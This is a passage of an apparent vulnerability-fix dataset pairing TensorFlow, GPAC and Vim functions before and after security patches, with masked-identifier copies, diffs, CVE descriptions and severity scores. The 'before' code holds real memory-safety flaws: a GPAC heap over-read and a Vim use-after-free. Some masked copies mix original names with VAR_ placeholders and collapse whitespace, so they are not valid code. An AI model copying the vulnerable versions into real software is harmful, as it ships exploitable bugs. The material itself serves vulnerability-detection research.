    res_attrs.push_back(output_attrs.getDictionary(context));
    ++res_num;
  }
  attrs.push_back(
      builder.getNamedAttr(function_interface_impl::getResultDictAttrName(),
                           builder.getArrayAttr(res_attrs)));

  values_map.clear();
  Block* body = new Block();
  func_op.body().push_back(body);
  Type control_ty = ControlType::get(context);
  // Create the block arguments and populate the `values_map` with the matching
  // input names.
  for (auto type_and_name : llvm::zip(arg_types, arg_names)) {
    Value arg = body->addArgument(std::get<0>(type_and_name), unknown_loc);
    llvm::StringMap<SmallVector<Value, 1>>& values =
        values_map[std::get<1>(type_and_name)];
    Value ctl = body->addArgument(control_ty, unknown_loc);
    values[""""].push_back(arg);
    values[""^""].push_back(ctl);
  }

  // Pre-populate the nodes_map with the needed slots for the return.
  OpBuilder body_builder = OpBuilder::atBlockEnd(body);
  // We use placeholders during the import to create ""fake"" operations to break
  // cycles: we need operands to feed to the users.
  OperationName mlir_placeholder(""tfg.__mlir_placeholder"", context);
  Type placeholder_ty = OpaqueTensorType::get(context);
  ValueMapManager value_manager(values_map, body_builder, mlir_placeholder,
                                placeholder_ty, control_ty, unknown_loc);

  // Import the function body here, after this we have a function with all
  // the nodes, and the nodes_map contains the mapping from node_name to actual
  // MLIR Operations.
  TF_RETURN_WITH_CONTEXT_IF_ERROR(
      ImportNodes(value_manager, func.node_def(), body_builder),
      "" when importing function "", func.signature().name());

  // After the body, the final part is to setup the return. It comes in two
  // parts: the `ret` field from the FunctionDef for the regular output and the
  // `control_ret` field for the control output.
  //
  // Because `ret` and `control_ret` aren't ordered, there is an indirection to
  // the FunctionDef signature to retrieve the position of each `ret` and
  // `control_ret` entry by name. We compute this mapping from the name of an
  // output to the position in the result array first.
  res_num = 0;
  llvm::StringMap<int> output_name_to_position;
  for (const OpDef::ArgDef& output : signature.output_arg()) {
    if (output_name_to_position.count(output.name()))
      return InvalidArgument(""Duplicated output_arg entry"", output.name());
    output_name_to_position[output.name()] = res_num;
    ++res_num;
  }
  res_num = 0;
  llvm::StringMap<int> control_output_to_position;
  for (const std::string& output : signature.control_output()) {
    if (control_output_to_position.count(output))
      return InvalidArgument(""Duplicated control_output entry"", output);
    control_output_to_position[output] = res_num;
    ++res_num;
  }

  // We pre-allocate the array of operands and populate it using the
  // `output_name_to_position` and `control_output_to_position` populated
  // previously.
  SmallVector<Value> ret_vals(func.ret_size() + func.control_ret_size(),
                              Value());
  for (const auto& ret_val : func.ret()) {
    auto position = output_name_to_position.find(ret_val.first);
    if (position == output_name_to_position.end())
      return InvalidArgument(
          ""Can't import function, returned value references unknown output ""
          ""argument "",
          ret_val.first);
    ret_vals[position->second] =
        value_manager.GetValueOrCreatePlaceholder(ret_val.second);
  }
  for (const auto& ret_val : func.control_ret()) {
    auto position = control_output_to_position.find(ret_val.first);
    if (position == control_output_to_position.end())
      return InvalidArgument(
          ""Can't import function, returned value references unknown output ""
          ""argument "",
          ret_val.first);
    Value result = value_manager.GetValueOrCreatePlaceholder(
        (Twine(""^"") + ret_val.second).str());
    if (!result.getType().isa<ControlType>())
      return InvalidArgument(""failed to map returned value "", ret_val.second,
                             "", isn't a control output"");
    ret_vals[func.ret_size() + position->second] = result;
  }
  // Check that all the of the return operands have been populated.
  for (auto& indexed_val : llvm::enumerate(ret_vals)) {
    if (indexed_val.value()) continue;
    return InvalidArgument(
        ""Failed to import function, missing output for position "",
        indexed_val.index());
  }
  MutableArrayRef<Value> operands = ret_vals;
  ReturnOp ret_op = body_builder.create<ReturnOp>(
      unknown_loc, operands.slice(0, func.ret_size()),
      operands.slice(func.ret_size()));

  // Now that we have all the types, set the function signature as the
  // ""function_type"" attribute.
  {
    SmallVector<Type> arg_types_with_ctl;
    for (Type type : arg_types) {
      arg_types_with_ctl.push_back(type);
      arg_types_with_ctl.push_back(control_ty);
    }
    attrs.append(""function_type"",
                 TypeAttr::get(builder.getFunctionType(
                     arg_types_with_ctl, ret_op.getOperandTypes())));
  }
  func_op->setAttrs(attrs);
  return Status::OK();
}","Status ImportGenericFunction(
    GraphFuncOp VAR_0, const FunctionDef& VAR_1,
    llvm::StringMap<llvm::StringMap<SmallVector<Value, 1>>>& VAR_2,
    OpBuilder& VAR_3) {
  const OpDef& VAR_4 = VAR_1.signature();
  Location VAR_5 = VAR_3.getUnknownLoc();
  MLIRContext* VAR_6 = VAR_3.getContext();

  TFGraphDialect* VAR_7 = VAR_8<TFGraphDialect>(VAR_0->getDialect());
  NamedAttrList VAR_9;
  DictionaryAttr VAR_10 = VAR_3.getDictionaryAttr({});
  if (VAR_4.name().empty())
    return InvalidArgument(""generic function without a name"");
  VAR_9.append(""sym_name"", VAR_3.getStringAttr(VAR_4.name()));
  VAR_9.append(""generic"", VAR_3.getUnitAttr());
  if (!VAR_4.description().empty())
    VAR_9.append(""description"", VAR_3.getStringAttr(VAR_4.description()));
  if (VAR_4.is_stateful())
    VAR_9.append(""is_stateful"", VAR_3.getUnitAttr());
  if (VAR_4.control_output_size()) {
    llvm::SmallVector<Attribute> VAR_11;
    for (const std::string& VAR_12 : VAR_4.control_output())
      VAR_11.push_back(VAR_3.getStringAttr(VAR_12));
    VAR_9.append(""control_output"", VAR_3.getArrayAttr(VAR_11));
  }
  {
    NamedAttrList VAR_13;
    for (const OpDef_AttrDef& VAR_14 : VAR_4.attr()) {
      NamedAttrList VAR_15;
      if (VAR_14.name().empty())
        return InvalidArgument(""Missing name for function attribute"");
      if (!VAR_14.type().empty())
        VAR_15.append(VAR_3.getNamedAttr(
            ""function_type"", VAR_3.getStringAttr(VAR_14.type())));
      if (VAR_14.has_default_value()) {
        TF_ASSIGN_OR_RETURN(
            Attribute VAR_14,
            ConvertAttributeValue(attr.default_value(), builder, tfgDialect));
        VAR_15.append(builder.getNamedAttr(""default_value"", attr));
      }
      if (!attr.description().empty())
        VAR_15.append(builder.getNamedAttr(
            ""description"", builder.getStringAttr(attr.description())));
      if (attr.has_minimum() || attr.minimum())
        VAR_15.append(builder.getNamedAttr(
            ""minimum"", builder.getI32IntegerAttr(attr.minimum())));
      if (attr.has_allowed_values()) {
        TF_ASSIGN_OR_RETURN(
            Attribute attr,
            ConvertAttributeValue(attr.allowed_values(), builder, tfgDialect));
        VAR_15.append(builder.getNamedAttr(""allowed_values"", attr));
      }
      VAR_13.append(builder.getNamedAttr(
          attr.name(), VAR_15.getDictionary(builder.getContext())));
    }
    if (!VAR_13.empty()) {
      VAR_10 = VAR_13.getDictionary(builder.getContext());
      VAR_9.append(""tfg.func_attrs"", VAR_10);
    }
  }

  /* COMMENT_0 */
  /* COMMENT_1 */
  if (VAR_1.resource_arg_unique_id_size()) {
    SmallVector<int32_t> VAR_16;
    SmallVector<int32_t> VAR_17;
    for (const auto& VAR_18 : VAR_1.resource_arg_unique_id()) {
      VAR_16.push_back(VAR_18.first);
      VAR_17.push_back(VAR_18.second);
    }
    VAR_9.append(""resource_arg_unique_ids_keys"",
                 builder.getI32TensorAttr(VAR_16));
    VAR_9.append(""resource_arg_unique_ids_values"",
                 builder.getI32TensorAttr(VAR_17));
  }

  /* COMMENT_2 */
  /* COMMENT_3 */
  for (const auto& VAR_19 : VAR_1.attr()) {
    if (VAR_19.first.empty())
      return InvalidArgument(""Invalid function attribute name"");
    const std::string& VAR_20 = ""tf."" + VAR_19.first;
    const AttrValue& VAR_21 = VAR_19.second;
    TF_ASSIGN_OR_RETURN(Attribute attr,
                        ConvertAttributeValue(tf_attr, builder, tfgDialect));
    VAR_9.append(VAR_20, attr);
  }
  SmallString<8> VAR_22;
  SmallString<8> VAR_23;
  /* COMMENT_4 */
  /* COMMENT_5 */
  /* COMMENT_6 */
  /* COMMENT_7 */
  /* COMMENT_8 */
  int VAR_24 = 0;
  llvm::SmallVector<StringRef> VAR_25;
  llvm::SmallVector<Type> VAR_26;
  llvm::SmallVector<Attribute> VAR_27;
  llvm::SmallVector<Attribute> VAR_28;
  for (const auto& VAR_29 : llvm::enumerate(VAR_4.input_arg())) {
    const OpDef::ArgDef& VAR_30 = VAR_29.value();
    TF_ASSIGN_OR_RETURN(NamedAttrList VAR_31,
                        ConvertArgDefAttributes(input, tfgDialect, builder));
    auto VAR_32 = VAR_1.arg_attr().find(VAR_29.index());
    if (VAR_32 != VAR_1.arg_attr().end()) {
      NamedAttrList VAR_33;
      for (const auto& VAR_34 : VAR_32->second.attr()) {
        TF_ASSIGN_OR_RETURN(
            Attribute attr,
            ConvertAttributeValue(named_attr.VAR_35, builder, tfgDialect));
        VAR_33.append(named_attr.first, attr);
      }
      VAR_31.append(""tfg.arg_attrs"",
                         VAR_33.getDictionary(builder.getContext()));
    }
    VAR_25.push_back(builder.getStringAttr(input.name()).getValue());
    VAR_26.push_back(OpaqueTensorType::get(VAR_6));
    VAR_27.push_back(VAR_31.getDictionary(VAR_6));
    VAR_27.push_back(NamedAttrList{}.getDictionary(VAR_6));
    VAR_24++;
  }
  VAR_9.push_back(
      builder.getNamedAttr(function_interface_impl::getArgDictAttrName(),
                           builder.getArrayAttr(VAR_27)));

  /* COMMENT_9 */
  int VAR_36 = 0;
  for (const OpDef::ArgDef& VAR_12 : VAR_4.output_arg()) {
    TF_ASSIGN_OR_RETURN(NamedAttrList VAR_37,
                        ConvertArgDefAttributes(output, tfgDialect, builder));
    VAR_28.push_back(VAR_37.getDictionary(VAR_6));
    ++VAR_36;
  }
  /* COMMENT_10 */
  for (const std::string& output : VAR_4.control_output()) {
    NamedAttrList VAR_37;
    VAR_37.append(""tfg.name"", builder.getStringAttr(output));
    VAR_28.push_back(VAR_37.getDictionary(VAR_6));
    ++VAR_36;
  }
  VAR_9.push_back(
      builder.getNamedAttr(function_interface_impl::getResultDictAttrName(),
                           builder.getArrayAttr(VAR_28)));

  VAR_2.clear();
  Block* VAR_38 = new Block();
  VAR_0.body().push_back(VAR_38);
  Type VAR_39 = ControlType::get(VAR_6);
  /* COMMENT_11 */
  /* COMMENT_12 */
  for (auto VAR_40 : llvm::zip(VAR_26, VAR_25)) {
    Value VAR_41 = VAR_38->addArgument(std::VAR_42<0>(VAR_40), VAR_5);
    llvm::StringMap<SmallVector<Value, 1>>& VAR_43 =
        VAR_2[std::VAR_42<1>(VAR_40)];
    Value VAR_44 = VAR_38->addArgument(VAR_39, VAR_5);
    VAR_43[""""].push_back(VAR_41);
    VAR_43[""^""].push_back(VAR_44);
  }

  /* COMMENT_13 */
  OpBuilder VAR_45 = OpBuilder::atBlockEnd(VAR_38);
  /* COMMENT_14 */
  /* COMMENT_15 */
  OperationName VAR_46(""tfg.__mlir_placeholder"", VAR_6);
  Type VAR_47 = OpaqueTensorType::get(VAR_6);
  ValueMapManager value_manager(values_map, body_builder, mlir_placeholder,
                                placeholder_ty, control_ty, unknown_loc);

  /* COMMENT_16 */
  /* COMMENT_17 */
  /* COMMENT_18 */
  TF_RETURN_WITH_CONTEXT_IF_ERROR(
      ImportNodes(VAR_48, VAR_1.node_def(), body_builder),
      "" when importing function "", VAR_1.signature().name());

  /* COMMENT_19 */
  /* COMMENT_20 */
  /* COMMENT_21 */
  /* COMMENT_22 */
  /* COMMENT_23 */
  /* COMMENT_24 */
  /* COMMENT_25 */
  /* COMMENT_26 */
  VAR_36 = 0;
  llvm::StringMap<int> VAR_49;
  for (const OpDef::ArgDef& output : VAR_4.output_arg()) {
    if (VAR_49.count(output.name()))
      return InvalidArgument(""Duplicated output_arg entry"", output.name());
    VAR_49[output.name()] = VAR_36;
    ++VAR_36;
  }
  VAR_36 = 0;
  llvm::StringMap<int> VAR_50;
  for (const std::string& output : VAR_4.control_output()) {
    if (VAR_50.count(output))
      return InvalidArgument(""Duplicated control_output entry"", output);
    VAR_50[output] = VAR_36;
    ++VAR_36;
  }

  /* COMMENT_27 */
  /* COMMENT_28 */
  /* COMMENT_29 */
  SmallVector<Value> VAR_51(VAR_1.ret_size() + VAR_1.control_ret_size(),
                              Value());
  for (const auto& VAR_52 : VAR_1.ret()) {
    auto VAR_53 = VAR_49.find(VAR_52.first);
    if (VAR_53 == VAR_49.end())
      return InvalidArgument(
          ""Can't import function, returned value references unknown output ""
          ""argument "",
          VAR_52.first);
    VAR_51[VAR_53->second] =
        VAR_48.GetValueOrCreatePlaceholder(VAR_52.second);
  }
  for (const auto& VAR_52 : VAR_1.control_ret()) {
    auto VAR_53 = VAR_50.find(VAR_52.first);
    if (VAR_53 == VAR_50.end())
      return InvalidArgument(
          ""Can't import function, returned value references unknown output ""
          ""argument "",
          VAR_52.first);
    Value VAR_54 = VAR_48.GetValueOrCreatePlaceholder(
        (Twine(""^"") + VAR_52.second).str());
    if (!VAR_54.getType().isa<ControlType>())
      return InvalidArgument(""failed to map returned value "", VAR_52.second,
                             "", isn't a control output"");
    VAR_51[VAR_1.ret_size() + VAR_53->second] = VAR_54;
  }
  /* COMMENT_30 */
  for (auto& VAR_55 : llvm::enumerate(VAR_51)) {
    if (VAR_55.value()) continue;
    return InvalidArgument(
        ""Failed to import function, missing output for position "",
        VAR_55.index());
  }
  MutableArrayRef<Value> VAR_56 = VAR_51;
  ReturnOp VAR_57 = body_builder.create<ReturnOp>(
      unknown_loc, VAR_56.slice(0, VAR_1.ret_size()),
      VAR_56.slice(VAR_1.ret_size()));

  /* COMMENT_31 */
  /* COMMENT_32 */
  {
    SmallVector<Type> VAR_58;
    for (Type VAR_59 : VAR_26) {
      VAR_58.push_back(VAR_59);
      VAR_58.push_back(control_ty);
    }
    VAR_9.append(""function_type"",
                 TypeAttr::get(builder.getFunctionType(
                     VAR_58, VAR_57.getOperandTypes())));
  }
  VAR_0->setAttrs(VAR_9);
  return Status::OK();
}",tensorflow/1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b/functiondef_import.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -77,6 +77,8 @@
   // Import the function attributes with a `tf.` prefix to match the current
   // infrastructure expectations.
   for (const auto& namedAttr : func.attr()) {
+    if (namedAttr.first.empty())
+      return InvalidArgument(""Invalid function attribute name"");
     const std::string& name = ""tf."" + namedAttr.first;
     const AttrValue& tf_attr = namedAttr.second;
     TF_ASSIGN_OR_RETURN(Attribute attr,","{'deleted_lines': [], 'added_lines': ['    if (namedAttr.first.empty())', '      return InvalidArgument(""Invalid function attribute name"");']}",True,"TensorFlow is an open source platform for machine learning. When `mlir::tfg::ConvertGenericFunctionToFunctionDef` is given empty function attributes, it gives a null dereference. We have patched the issue in GitHub commit 1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b. The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range. There are no known workarounds for this issue.",5.9,MEDIUM,1,valid,2022-05-14T03:14:36Z,4
CVE-2022-30976,['CWE-125'],AV:N/AC:H/Au:N/C:P/I:N/A:P,0,gpac,fixed #2179,915e2cba715f36b7cc29e28888117831ca143d78,https://github.com/gpac/gpac/commit/915e2cba715f36b7cc29e28888117831ca143d78,src/isomedia/box_code_base.c,xtra_box_read,"GF_Err xtra_box_read(GF_Box *s, GF_BitStream *bs)
{
GF_XtraBox *ptr = (GF_XtraBox *)s;
while (ptr->size) {
GF_XtraTag *tag;
u32 prop_type = 0;
char *data=NULL, *data2=NULL;
ISOM_DECREASE_SIZE_NO_ERR(ptr, 8)
s32 tag_size = gf_bs_read_u32(bs);
u32 name_size = gf_bs_read_u32(bs);
if (tag_size < 8) return GF_ISOM_INVALID_FILE;
tag_size -= 8;
if ((tag_size>ptr->size) || (name_size>ptr->size)) {
return GF_ISOM_INVALID_FILE;
}
ISOM_DECREASE_SIZE_NO_ERR(ptr, 10)
ISOM_DECREASE_SIZE_NO_ERR(ptr, name_size)
data = gf_malloc(sizeof(char) * (name_size+1));
gf_bs_read_data(bs, data, name_size);
data[name_size] = 0;
tag_size-=name_size;
u32 flags = gf_bs_read_u32(bs);
u32 prop_size = gf_bs_read_u32(bs);
tag_size-=8;
if (prop_size>4) {
tag_size-=2;
prop_type = gf_bs_read_u16(bs);
prop_size -= 6;
ISOM_DECREASE_SIZE_NO_ERR(ptr, prop_size)
data2 = gf_malloc(sizeof(char) * (prop_size));
gf_bs_read_data(bs, data2, prop_size);
tag_size-=prop_size;
} else {
prop_size = 0;
}
GF_SAFEALLOC(tag, GF_XtraTag)
tag->flags = flags;
tag->name = data;
tag->prop_size = prop_size;
tag->prop_value = data2;
tag->prop_type = prop_type;
gf_list_add(ptr->tags, tag);
if (tag_size) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[isom] invalid tag size in Xtra !\n""));
}
}
return GF_OK;
}","GF_Err xtra_box_read(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
GF_XtraBox *VAR_2 = (GF_XtraBox *)VAR_0;
while (VAR_2->size) {
GF_XtraTag *VAR_3;
u32 VAR_4 = 0;
char *VAR_5=NULL, *VAR_6=NULL;
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 8)
s32 VAR_7 = gf_bs_read_u32(VAR_1);
u32 VAR_8 = gf_bs_read_u32(VAR_1);
if (VAR_7 < 8) return VAR_9;
VAR_7 -= 8;
if ((VAR_7>VAR_2->size) || (VAR_8>VAR_2->size)) {
return VAR_9;
}
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 10)
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_8)
VAR_5 = gf_malloc(sizeof(char) * (VAR_8+1));
gf_bs_read_data(VAR_1, VAR_5, VAR_8);
VAR_5[VAR_8] = 0;
VAR_7-=VAR_8;
u32 VAR_10 = gf_bs_read_u32(VAR_1);
u32 VAR_11 = gf_bs_read_u32(VAR_1);
VAR_7-=8;
if (VAR_11>4) {
VAR_7-=2;
VAR_4 = gf_bs_read_u16(VAR_1);
VAR_11 -= 6;
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_11)
VAR_6 = gf_malloc(sizeof(char) * (VAR_11));
gf_bs_read_data(VAR_1, VAR_6, VAR_11);
VAR_7-=VAR_11;
} else {
VAR_11 = 0;
}
GF_SAFEALLOC(VAR_3, GF_XtraTag)
VAR_3->flags = VAR_10;
VAR_3->name = VAR_5;
VAR_3->prop_size = VAR_11;
VAR_3->prop_value = VAR_6;
VAR_3->prop_type = VAR_4;
gf_list_add(VAR_2->tags, VAR_3);
if (VAR_7) {
GF_LOG(VAR_12, VAR_13, (""[isom] invalid tag size in Xtra !\n""));
}
}
return VAR_14;
}",gpac/915e2cba715f36b7cc29e28888117831ca143d78/box_code_base.c/vul/before/0.json,"GF_Err xtra_box_read(GF_Box *s, GF_BitStream *bs)
{
	GF_XtraBox *ptr = (GF_XtraBox *)s;
	while (ptr->size) {
		GF_XtraTag *tag;
		u32 prop_type = 0;

		char *data=NULL, *data2=NULL;
		ISOM_DECREASE_SIZE_NO_ERR(ptr, 8)
		s32 tag_size = gf_bs_read_u32(bs);
		u32 name_size = gf_bs_read_u32(bs);
		if (tag_size < 8) return GF_ISOM_INVALID_FILE;

		tag_size -= 8;
		if ((tag_size>ptr->size) || (name_size>ptr->size)) {
			return GF_ISOM_INVALID_FILE;
		}
		ISOM_DECREASE_SIZE_NO_ERR(ptr, 10)

		ISOM_DECREASE_SIZE_NO_ERR(ptr, name_size)
		data = gf_malloc(sizeof(char) * (name_size+1));
		gf_bs_read_data(bs, data, name_size);
		data[name_size] = 0;
		tag_size-=name_size;

		u32 flags = gf_bs_read_u32(bs);
		u32 prop_size = gf_bs_read_u32(bs);
		tag_size-=8;

		if (prop_size>4) {
			tag_size-=2;
			prop_type = gf_bs_read_u16(bs);
			prop_size -= 6;
			ISOM_DECREASE_SIZE_NO_ERR(ptr, prop_size)
			//add 2 extra bytes for UTF16 case string dump
			data2 = gf_malloc(sizeof(char) * (prop_size+2));
			gf_bs_read_data(bs, data2, prop_size);
			data2[prop_size] = 0;
			data2[prop_size+1] = 0;
			tag_size-=prop_size;
		} else {
			prop_size = 0;
		}
		GF_SAFEALLOC(tag, GF_XtraTag)
		tag->flags = flags;
		tag->name = data;
		tag->prop_size = prop_size;
		tag->prop_value = data2;
		tag->prop_type = prop_type;
		gf_list_add(ptr->tags, tag);

		if (tag_size) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[isom] invalid tag size in Xtra !\n""));
		}
	}
	return GF_OK;
}","GF_Err xtra_box_read(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
	GF_XtraBox *VAR_2 = (GF_XtraBox *)VAR_0;
	while (VAR_2->size) {
		GF_XtraTag *VAR_3;
		u32 VAR_4 = 0;

		char *VAR_5=NULL, *VAR_6=NULL;
		ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 8)
		s32 VAR_7 = gf_bs_read_u32(VAR_1);
		u32 VAR_8 = gf_bs_read_u32(VAR_1);
		if (VAR_7 < 8) return VAR_9;

		VAR_7 -= 8;
		if ((VAR_7>VAR_2->size) || (VAR_8>VAR_2->size)) {
			return VAR_9;
		}
		ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 10)

		ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_8)
		VAR_5 = gf_malloc(sizeof(char) * (VAR_8+1));
		gf_bs_read_data(VAR_1, VAR_5, VAR_8);
		VAR_5[VAR_8] = 0;
		VAR_7-=VAR_8;

		u32 VAR_10 = gf_bs_read_u32(VAR_1);
		u32 VAR_11 = gf_bs_read_u32(VAR_1);
		VAR_7-=8;

		if (VAR_11>4) {
			VAR_7-=2;
			VAR_4 = gf_bs_read_u16(VAR_1);
			VAR_11 -= 6;
			ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_11)
			/* COMMENT_0 */
			VAR_6 = gf_malloc(sizeof(char) * (VAR_11+2));
			gf_bs_read_data(VAR_1, VAR_6, VAR_11);
			VAR_6[VAR_11] = 0;
			VAR_6[VAR_11+1] = 0;
			VAR_7-=VAR_11;
		} else {
			VAR_11 = 0;
		}
		GF_SAFEALLOC(VAR_3, GF_XtraTag)
		VAR_3->flags = VAR_10;
		VAR_3->name = VAR_5;
		VAR_3->prop_size = VAR_11;
		VAR_3->prop_value = VAR_6;
		VAR_3->prop_type = VAR_4;
		gf_list_add(VAR_2->tags, VAR_3);

		if (VAR_7) {
			GF_LOG(VAR_12, VAR_13, (""[isom] invalid tag size in Xtra !\n""));
		}
	}
	return VAR_14;
}",gpac/915e2cba715f36b7cc29e28888117831ca143d78/box_code_base.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -32,8 +32,11 @@
 			prop_type = gf_bs_read_u16(bs);
 			prop_size -= 6;
 			ISOM_DECREASE_SIZE_NO_ERR(ptr, prop_size)
-			data2 = gf_malloc(sizeof(char) * (prop_size));
+			//add 2 extra bytes for UTF16 case string dump
+			data2 = gf_malloc(sizeof(char) * (prop_size+2));
 			gf_bs_read_data(bs, data2, prop_size);
+			data2[prop_size] = 0;
+			data2[prop_size+1] = 0;
 			tag_size-=prop_size;
 		} else {
 			prop_size = 0;","{'deleted_lines': ['\t\t\tdata2 = gf_malloc(sizeof(char) * (prop_size));'], 'added_lines': ['\t\t\t//add 2 extra bytes for UTF16 case string dump', '\t\t\tdata2 = gf_malloc(sizeof(char) * (prop_size+2));', '\t\t\tdata2[prop_size] = 0;', '\t\t\tdata2[prop_size+1] = 0;']}",True,"GPAC 2.0.0 misuses a certain Unicode utf8_wcslen (renamed gf_utf8_wcslen) function in utils/utf.c, resulting in a heap-based buffer over-read, as demonstrated by MP4Box.",7.1,HIGH,2,valid,2022-05-16T10:15:20Z,4
CVE-2022-1898,['CWE-416'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,vim,"patch 8.2.5024: using freed memory with ""]d""

Problem:    Using freed memory with ""]d"".
Solution:   Copy the pattern before searching.",e2fa213cf571041dbd04ab0329303ffdc980678a,https://github.com/vim/vim/commit/e2fa213cf571041dbd04ab0329303ffdc980678a,src/normal.c,nv_brackets,"static void
nv_brackets(cmdarg_T *cap)
{
pos_Tprev_pos;
pos_T*pos = NULL;        pos_Told_pos;        intflag;
longn;
cap->oap->motion_type = MCHAR;
cap->oap->inclusive = FALSE;
old_pos = curwin->w_cursor;
curwin->w_cursor.coladd = 0;    
#ifdef FEAT_SEARCHPATH
if (cap->nchar == 'f')
nv_gotofile(cap);
else
#endif
#ifdef FEAT_FIND_ID
if (vim_strchr((char_u *)""iI\011dD\004"", cap->nchar) != NULL)
{
char_u*ptr;
intlen;
if ((len = find_ident_under_cursor(&ptr, FIND_IDENT)) == 0)
clearop(cap->oap);
else
{
find_pattern_in_path(ptr, 0, len, TRUE,
cap->count0 == 0 ? !isupper(cap->nchar) : FALSE,
((cap->nchar & 0xf) == ('d' & 0xf)) ?  FIND_DEFINE : FIND_ANY,
cap->count1,
isupper(cap->nchar) ? ACTION_SHOW_ALL :
islower(cap->nchar) ? ACTION_SHOW : ACTION_GOTO,
cap->cmdchar == ']' ? curwin->w_cursor.lnum + 1 : (linenr_T)1,
(linenr_T)MAXLNUM);
curwin->w_set_curswant = TRUE;
}
}
else
#endif
if (  (cap->cmdchar == '['
&& vim_strchr((char_u *)""{(*/#mM"", cap->nchar) != NULL)
|| (cap->cmdchar == ']'
&& vim_strchr((char_u *)""})*/#mM"", cap->nchar) != NULL))
nv_bracket_block(cap, &old_pos);
else if (cap->nchar == '[' || cap->nchar == ']')
{
if (cap->nchar == cap->cmdchar)        flag = '{';
else
flag = '}';    
curwin->w_set_curswant = TRUE;
if (!findpar(&cap->oap->inclusive, cap->arg, cap->count1, flag,
(cap->oap->op_type != OP_NOP
&& cap->arg == FORWARD && flag == '{')))
clearopbeep(cap->oap);
else
{
if (cap->oap->op_type == OP_NOP)
beginline(BL_WHITE | BL_FIX);
#ifdef FEAT_FOLDING
if ((fdo_flags & FDO_BLOCK) && KeyTyped && cap->oap->op_type == OP_NOP)
foldOpenCursor();
#endif
}
}
else if (cap->nchar == 'p' || cap->nchar == 'P')
{
nv_put_opt(cap, TRUE);
}
else if (cap->nchar == '\'' || cap->nchar == '`')
{
pos = &curwin->w_cursor;
for (n = cap->count1; n > 0; --n)
{
prev_pos = *pos;
pos = getnextmark(pos, cap->cmdchar == '[' ? BACKWARD : FORWARD,
cap->nchar == '\'');
if (pos == NULL)
break;
}
if (pos == NULL)
pos = &prev_pos;
nv_cursormark(cap, cap->nchar == '\'', pos);
}
else if (cap->nchar >= K_RIGHTRELEASE && cap->nchar <= K_LEFTMOUSE)
{
(void)do_mouse(cap->oap, cap->nchar,
(cap->cmdchar == ']') ? FORWARD : BACKWARD,
cap->count1, PUT_FIXINDENT);
}
#ifdef FEAT_FOLDING
else if (cap->nchar == 'z')
{
if (foldMoveTo(FALSE, cap->cmdchar == ']' ? FORWARD : BACKWARD,
cap->count1) == FAIL)
clearopbeep(cap->oap);
}
#endif
#ifdef FEAT_DIFF
else if (cap->nchar == 'c')
{
if (diff_move_to(cap->cmdchar == ']' ? FORWARD : BACKWARD,
cap->count1) == FAIL)
clearopbeep(cap->oap);
}
#endif
#ifdef FEAT_SPELL
else if (cap->nchar == 's' || cap->nchar == 'S')
{
setpcmark();
for (n = 0; n < cap->count1; ++n)
if (spell_move_to(curwin, cap->cmdchar == ']' ? FORWARD : BACKWARD,
cap->nchar == 's' ? TRUE : FALSE, FALSE, NULL) == 0)
{
clearopbeep(cap->oap);
break;
}
else
curwin->w_set_curswant = TRUE;
# ifdef FEAT_FOLDING
if (cap->oap->op_type == OP_NOP && (fdo_flags & FDO_SEARCH) && KeyTyped)
foldOpenCursor();
# endif
}
#endif
else
clearopbeep(cap->oap);
}","static void
nv_brackets(cmdarg_T *VAR_0)
{
pos_TVAR_1;
pos_T*VAR_2 = NULL;    
pos_TVAR_3;    
intVAR_4;
longVAR_5;
VAR_0->oap->motion_type = VAR_6;
VAR_0->oap->inclusive = FALSE;
VAR_3 = VAR_7->w_cursor;
VAR_7->w_cursor.coladd = 0;    
#ifdef VAR_8
if (VAR_0->nchar == 'f')
nv_gotofile(VAR_0);
else
#endif
#ifdef VAR_9
if (vim_strchr((char_u *)""iI\011dD\004"", VAR_0->nchar) != NULL)
{
char_u*VAR_10;
intVAR_11;
if ((VAR_11 = find_ident_under_cursor(&VAR_10, VAR_12)) == 0)
clearop(VAR_0->oap);
else
{
find_pattern_in_path(VAR_10, 0, VAR_11, TRUE,
VAR_0->count0 == 0 ? !isupper(VAR_0->nchar) : FALSE,
((VAR_0->nchar & 0xf) == ('d' & 0xf)) ?  VAR_13 : VAR_14,
VAR_0->count1,
isupper(VAR_0->nchar) ? VAR_15 :
islower(VAR_0->nchar) ? VAR_16 : VAR_17,
VAR_0->cmdchar == ']' ? VAR_7->w_cursor.lnum + 1 : (linenr_T)1,
(linenr_T)VAR_18);
VAR_7->w_set_curswant = TRUE;
}
}
else
#endif
if (  (VAR_0->cmdchar == '['
&& vim_strchr((char_u *)""{(*/#mM"", VAR_0->nchar) != NULL)
|| (VAR_0->cmdchar == ']'
&& vim_strchr((char_u *)""})*/#mM"", VAR_0->nchar) != NULL))
nv_bracket_block(VAR_0, &VAR_3);
else if (VAR_0->nchar == '[' || VAR_0->nchar == ']')
{
if (VAR_0->nchar == VAR_0->cmdchar)    
VAR_4 = '{';
else
VAR_4 = '}';    
VAR_7->w_set_curswant = TRUE;
if (!findpar(&VAR_0->oap->inclusive, VAR_0->arg, VAR_0->count1, VAR_4,
(VAR_0->oap->op_type != VAR_19
&& VAR_0->arg == VAR_20 && VAR_4 == '{')))
clearopbeep(VAR_0->oap);
else
{
if (VAR_0->oap->op_type == VAR_19)
beginline(VAR_21 | VAR_22);
#ifdef VAR_23
if ((VAR_24 & VAR_25) && VAR_26 && VAR_0->oap->op_type == VAR_19)
foldOpenCursor();
#endif
}
}
else if (VAR_0->nchar == 'p' || VAR_0->nchar == 'P')
{
